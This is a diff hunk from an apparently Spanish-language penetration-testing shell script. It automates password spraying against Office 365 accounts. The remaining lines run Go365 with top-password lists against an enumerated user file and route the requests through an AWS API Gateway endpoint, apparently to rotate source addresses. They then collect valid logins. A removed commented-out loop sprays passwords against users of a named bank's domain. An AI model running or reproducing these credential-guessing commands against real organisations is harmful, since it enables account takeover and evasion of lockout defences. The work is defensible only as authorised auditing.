@@ -278,13 +278,7 @@ then
 	Go365 -endpoint rst -up correo_password.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	Go365 -endpoint rst -ul .enumeracion2/"$DOMAIN"_office365_users.txt -pl top10.txt -d $DOMAIN -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
 	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
-	
-	# for password in $(cat top10.txt); do
-	#  	echo -e "\t[+] Probando password $password"				
-	#  	office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password >> logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>/dev/null
-	# 	sleep 60
-	#  done
-	#  grep 'PWNED' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
+		
 fi
 ### Windows
 # check up, check false positive and save servicios/Windows2.txt
